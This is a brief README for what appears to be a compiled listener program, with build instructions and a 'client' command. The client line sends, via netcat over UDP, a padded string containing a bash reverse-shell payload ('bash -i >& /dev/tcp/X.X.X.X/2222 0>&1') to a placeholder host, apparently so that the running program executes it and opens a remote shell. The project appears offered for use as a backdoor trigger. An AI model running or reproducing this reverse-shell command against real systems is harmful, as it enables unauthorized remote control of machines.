# build and run
```
make app
./a.out
```

![image](https://user-images.githubusercontent.com/1846319/184612669-b393c611-0465-4a20-a7f1-09a70f5f8498.png)

# client

```
printf %-200s 'test bash -i >& /dev/tcp/X.X.X.X/2222 0>&1 end'|nc Y.Y.Y.Y 65533 -u
```

